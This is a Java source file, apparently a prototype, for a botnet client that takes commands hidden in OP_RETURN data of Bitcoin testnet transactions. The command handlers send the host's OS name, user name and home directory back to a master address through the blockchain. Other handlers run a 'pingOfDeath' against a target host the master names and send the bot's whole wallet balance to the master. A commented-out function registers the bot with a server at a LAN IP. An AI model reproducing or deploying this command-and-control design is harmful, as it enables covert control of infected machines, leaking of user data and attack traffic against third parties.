import java.io.File;
import java.io.IOException;
import java.net.URL;
import java.net.URLConnection;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.StringTokenizer;

import org.bitcoinj.core.Address;
import org.bitcoinj.core.BlockChain;
import org.bitcoinj.core.Coin;
import org.bitcoinj.core.ECKey;
import org.bitcoinj.core.NetworkParameters;
import org.bitcoinj.core.PeerGroup;
import org.bitcoinj.core.Transaction;
import org.bitcoinj.core.TransactionConfidence;
import org.bitcoinj.core.TransactionOutput;
import org.bitcoinj.core.listeners.DownloadProgressTracker;
import org.bitcoinj.kits.WalletAppKit;
import org.bitcoinj.net.discovery.DnsDiscovery;
import org.bitcoinj.params.TestNet3Params;
import org.bitcoinj.script.Script;
import org.bitcoinj.script.ScriptBuilder;
import org.bitcoinj.store.SPVBlockStore;
import org.bitcoinj.utils.BriefLogFormatter;
import org.bitcoinj.wallet.SendRequest;
import org.bitcoinj.wallet.Wallet;
import org.bitcoinj.wallet.listeners.WalletCoinsReceivedEventListener;
import org.icmp4j.IcmpPingRequest;
import org.icmp4j.IcmpPingResponse;
import org.icmp4j.IcmpPingUtil;

import com.google.common.util.concurrent.FutureCallback;
import com.google.common.util.concurrent.Futures;

public class Bot {

	private static Address masterAddress;
    
    private static SPVBlockStore blockStore;
    private static BlockChain chain;
    private static PeerGroup peerGroup;
    private static Wallet wallet;
    
    private static File walletFile;
    private static File blockchainFile;
    
    private static boolean rapidMethod;
    
    static List<Address> list;
    public static void main(String[] args) throws Exception {
        // This line makes the log output more compact and easily read, especially when using the JDK log adapter.
        BriefLogFormatter.init();
        

        // Figure out which network we should connect to. Each one gets its own set of files.
        NetworkParameters params;
        String filePrefix;
        params = TestNet3Params.get();
        filePrefix = "forwarding-service-testnet";
        
        
        //Build Main Dir
        File mainDir = new File("Bot99");
        if (!mainDir.exists())
        	if (!mainDir.mkdirs()) {
        		System.out.println("Error MainDir");
        	}
        
        
        //Build Wallet File
        walletFile = new File(mainDir+"/wallet.info");
        if (walletFile.exists()) {
        	wallet = Wallet.loadFromFile(walletFile);
        }
        else {
        	wallet = new Wallet(params);
        	System.out.println("Creato nuovo Wallet");
        	wallet.importKey(new ECKey());
        	wallet.saveToFile(walletFile);
        }
        
        //Build Blockchain File
        blockchainFile = new File(mainDir+"/blockchain.info");
        blockStore = new SPVBlockStore(params, blockchainFile);
        chain = new BlockChain(params, wallet, blockStore);
        peerGroup = new PeerGroup(params, chain);
        peerGroup.addPeerDiscovery(new DnsDiscovery(params));
        peerGroup.addWallet(wallet);
        
        
        list = wallet.getWatchedAddresses();
        if (list.size() < 1) {
            wallet.addWatchedAddress(wallet.freshReceiveAddress());
            list = wallet.getWatchedAddresses();
            System.out.println("New address created");
        }
        
        rapidMethod = false;
        
        // Start up a basic app using a class that automates some boilerplate.
        //kit = new WalletAppKit(params, new File("Bot3"), filePrefix);
        peerGroup.start();
        peerGroup.startBlockChainDownload(new DownloadProgressTracker() {

			@Override
			protected void doneDownload() {
				// TODO Auto-generated method stub
				super.doneDownload();
				System.out.println("--------------------Finish Download Blockchain-------------------");
		      
				try {
					wallet.saveToFile(walletFile);
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
				/*
		        System.out.println("You have " + list.size() + " addresses!");
		        for (Address a: list) {
		            System.out.println("Send coins to: " +a.toString());
		        }*/
				System.out.println("Send coins to: " +list.get(0).toString());

		        String balance = wallet.getBalance().toFriendlyString();
		        System.out.println(balance);
		     
		        System.out.println("Waiting for coins to arrive. Press Ctrl-C to quit.");
			}

			@Override
			protected void progress(double pct, int blocksSoFar, Date date) {
				// TODO Auto-generated method stub
				super.progress(pct, blocksSoFar, date);
				System.out.println("Download: " +(int)pct +"%");
				
			}

			@Override
			protected void startDownload(int blocks) {
				// TODO Auto-generated method stub
				super.startDownload(blocks);
				System.out.println("----------------Start Download Blockchain-------------------");
			}
        	
        });
        // Download the block chain and wait until it's done.
        //kit.startAsync();
        //kit.awaitRunning();
        
        
        // We want to know when we receive money.
        wallet.addCoinsReceivedEventListener(new WalletCoinsReceivedEventListener() {
            @Override
            public void onCoinsReceived(Wallet w, Transaction tx, Coin prevBalance, Coin newBalance) {
                // Runs in the dedicated "user thread" (see bitcoinj docs for more info on this).
                //
                // The transaction "tx" can either be pending, or included into a block (we didn't see the broadcast).
                Coin value = tx.getValueSentToMe(w);
                System.out.println("Received tx for " + value.toFriendlyString() + ": " + tx);
                System.out.println("Transaction will be forwarded after it confirms.");
                try {
					wallet.saveToFile(walletFile);
				} catch (IOException e1) {
					// TODO Auto-generated catch block
					e1.printStackTrace();
				}
                // Wait until it's made it into the block chain (may run immediately if it's already there).
                //
                // For this dummy app of course, we could just forward the unconfirmed transaction. If it were
                // to be double spent, no harm done. Wallet.allowSpendingUnconfirmedTransactions() would have to
                // be called in onSetupCompleted() above. But we don't do that here to demonstrate the more common
                // case of waiting for a block.
                if(wallet.getBalance().isGreaterThan(Coin.MILLICOIN)) {
                	rapidMethod = true;
                }
                else {
                	rapidMethod = false;
                }
                
                if(rapidMethod){
                	System.out.println("METODO VELOCE");
                	System.out.println("Il Bot ha: " +w.getBalance().toFriendlyString());
                    try {
     					String messaggio=readOpReturn(tx);
     					String[] v=messaggio.split("-");
     					String comando=v[0];
     					String serverAddress="";
     					
     				System.out.println("comando: "+comando);
     				
     				String addressString=v[1];
     				if (v.length>2)
     				serverAddress=v[2];
     				
     				
     				
     				System.out.println("address:"+addressString);
     				Address address=new Address(params,addressString);
     				String balance = wallet.getBalance().toFriendlyString();
     					if(!addressString.equalsIgnoreCase(list.get(0).toString()))
     					//gestione delle risposte a seconda dei comandi del botMaster
     					switch (comando) {
     					case "ping":
     						sendCommand("ping_ok-"+list.get(0).toString()+"-"+balance, address);
     						break;
     					case "os":
     						sendCommand("os_ok-"+list.get(0).toString()+"-"+System.getProperty("os.name")+"-"+balance, address);
                             break;
     					case "username":
     						sendCommand("username_ok-"+list.get(0).toString()+"-"+System.getProperty("user.name")+"-"+balance,address);
     						break;
     					case "userhome":
     						sendCommand("userhome_ok-"+list.get(0).toString()+"-"+System.getProperty("user.home")+"-"+balance,address);
     						break;
     					case "pingOfDeath":
     						String risultato=pingOfDeath(serverAddress);
    						sendCommand("pingOfDeath_ok-"+list.get(0).toString()+"-"+risultato+"-"+balance,address);
     					case "restart":
     						sendAllCoin("restart_ok-"+list.get(0).toString()+"-"+Coin.MICROCOIN.toFriendlyString(),address);
     					default:
     						break;
     					}
     				} catch (Exception e) {
     					// TODO Auto-generated catch block
     					e.printStackTrace();
     				}
                }
                
                Futures.addCallback(tx.getConfidence().getDepthFuture(1), new FutureCallback<TransactionConfidence>() {
                    @Override
                    public void onSuccess(TransactionConfidence result) {
                        System.out.println("Transazione ricevuta con successo!!!!!!");
                       
                        try {
							wallet.saveToFile(walletFile);
						} catch (IOException e1) {
							// TODO Auto-generated catch block
							e1.printStackTrace();
						}
                        
                        /*
                         * Inoltrare la transazione ricevuta nuovamente al BotMaster
                         */
                       // forwardCommand("ping_ok", tx);
                       
                        System.out.println("Il Bot ha: " +w.getBalance().toFriendlyString());
                        if (!rapidMethod) {
	                        try {
	        					String messaggio=readOpReturn(tx);
	        					String[] v=messaggio.split("-");
	        					String comando=v[0];
	        					String serverAddress="";
	        				System.out.println("comando: "+comando);
	        				
	        				String addressString=v[1];
	        				if(v.length>2)
	        				serverAddress=v[2];
	        				
	        				System.out.println("address:"+addressString);
	        				Address address=new Address(params,addressString);
	        				String balance = wallet.getBalance().minus(Coin.MILLICOIN).toFriendlyString();
	        				if (!addressString.equalsIgnoreCase(list.get(0).toString())){
	        					//gestione delle risposte a seconda dei comandi del botMaster
	        					switch (comando) {
	        					case "ping":
	        						sendCommand("ping_ok-"+list.get(0).toString()+"-"+balance, address);
	        						break;
	        					case "os":
	        						sendCommand("os_ok-"+list.get(0).toString()+"-"+System.getProperty("os.name")+"-"+balance, address);
	                                break;
	        					case "username":
	        						sendCommand("username_ok-"+list.get(0).toString()+"-"+System.getProperty("user.name")+"-"+balance,address);
	        						break;
	        					case "userhome":
	        						sendCommand("userhome_ok-"+list.get(0).toString()+"-"+System.getProperty("user.home")+"-"+balance,address);
	        						break;
	        					case "pingOfDeath":
	        						String risultato=pingOfDeath(serverAddress);
	        						sendCommand("pingOfDeath_ok-"+list.get(0).toString()+"-"+risultato+"-"+balance,address);
	         					case "restart":
	         						sendAllCoin("restart_ok-"+list.get(0).toString()+"-"+Coin.MICROCOIN.toFriendlyString(),address);
	        					default:
	        						break;
	        					}
	        				  }
	        				} catch (Exception e) {
	        					// TODO Auto-generated catch block
	        					e.printStackTrace();
	        				}
                        }
                        
                    }

                    @Override
                    public void onFailure(Throwable t) {
                        // This kind of future can't fail, just rethrow in case something weird happens.
                        throw new RuntimeException(t);
                    }
                });
                }
        });
        
        
        try {
            Thread.sleep(Long.MAX_VALUE);
        } catch (InterruptedException ignored) {}
        
        
    }
    
    public static String readOpReturn(Transaction tx) throws Exception {
    	String mess=""
;		List<TransactionOutput> ti = tx.getOutputs();
		
		for (TransactionOutput t : ti) {
			Script script = t.getScriptPubKey();
			
			if (script.isOpReturn()) {
				byte[] message = new byte[script.getProgram().length-2];
				
				System.arraycopy(script.getProgram(), 2, message, 0, script.getProgram().length-2);
					
				mess = new String(message);
				System.out.println("OP RETURN "+mess);
				
			}
			
		}return mess;
		
	}
    
    /*
     * Invio di un comando a un bot
     */
    public static String sendCommand(String command, Address masterAddress) throws Exception {

		byte[] hash = command.getBytes("UTF-8");
		
		Transaction transaction = new Transaction(wallet.getParams());
		
		transaction.addOutput(Coin.MILLICOIN, masterAddress);
		transaction.addOutput(Coin.ZERO, new ScriptBuilder().op(106).data(hash).build());
	
		SendRequest sendRequest = SendRequest.forTx(transaction);
		sendRequest.feePerKb = Coin.ZERO;
		
		String string = new String(hash);
		System.out.println("Sending ... " +string);
    	
		wallet.completeTx(sendRequest);   // Could throw InsufficientMoneyException

		peerGroup.setMaxConnections(1);
		peerGroup.broadcastTransaction(sendRequest.tx);
		
		return transaction.getHashAsString();		
	}
    
    /*
     * Invio di un comando a un bot
     */
    public static String sendAllCoin(String command, Address masterAddress) throws Exception {

		byte[] hash = command.getBytes("UTF-8");
		
		Transaction transaction = new Transaction(wallet.getParams());
		
		Coin value = Coin.MILLICOIN;
		if (wallet.getBalance().isGreaterThan(Coin.MILLICOIN)) {
			value = wallet.getBalance().minus(Coin.parseCoin("0.0009"));
		}
		
		transaction.addOutput(value, masterAddress);
		transaction.addOutput(Coin.ZERO, new ScriptBuilder().op(106).data(hash).build());
	
		SendRequest sendRequest = SendRequest.forTx(transaction);
		sendRequest.feePerKb = Coin.ZERO;
		
		String string = new String(hash);
		System.out.println("Sending ... " +string);
    	
		wallet.completeTx(sendRequest);   // Could throw InsufficientMoneyException

		peerGroup.setMaxConnections(1);
		peerGroup.broadcastTransaction(sendRequest.tx);
		
		return transaction.getHashAsString();		
	}
    
    public static String pingOfDeath(String serverAddress){
    	// request
    	
    	final IcmpPingRequest request = IcmpPingUtil.createIcmpPingRequest ();
    	String formattedResponse="";
    	String result="";
    	request.setHost (serverAddress);

        request.setPacketSize(650);
    	// repeat a few times
    	for (int count = 1; count <= 4; count ++) {

    	// delegate
    	final IcmpPingResponse response = IcmpPingUtil.executePingRequest (request);

    	// log
    	formattedResponse = IcmpPingUtil.formatResponse (response);
    	
    	System.out.println (formattedResponse);

    	// rest
    	try {
			Thread.sleep (1000);
		} catch (InterruptedException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
    	}
    	if(formattedResponse.contains("Error"))
    	   result="server non raggiunto";
    	else
    	   result=serverAddress;
    	
    	return result;
    }
    
   /* public static void registerBot(String address) throws IOException{
 	   String url="http://192.168.43.182:8080/ServerBotChain/WriteBotServlet?address="+address;
 		 URL u = new URL(url);
 		 URLConnection ucon = u.openConnection();
 		  ucon.getInputStream();
    }*/
    
    
    
   /* public static void forwardCommand(String response, String address) {
    	List<TransactionOutput> out = tx.getOutputs();
        //List<TransactionInput> in = tx.getInputs();
        
        Address a = null;
        for (TransactionOutput o : out) {
        	o.getAddressFromP2PKHScript(kit.wallet().getParams());
        	if (o.getAddressFromP2PKHScript(kit.wallet().getParams()) != null) {
        		a = o.getAddressFromP2PKHScript(kit.wallet().getParams());
        		break;
        	}
        }
        System.out.println("Hai ricevuto i Coins da: " + a.toString());
        
        try {
			sendCommand(response, a);
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
    }
    */
    
    
}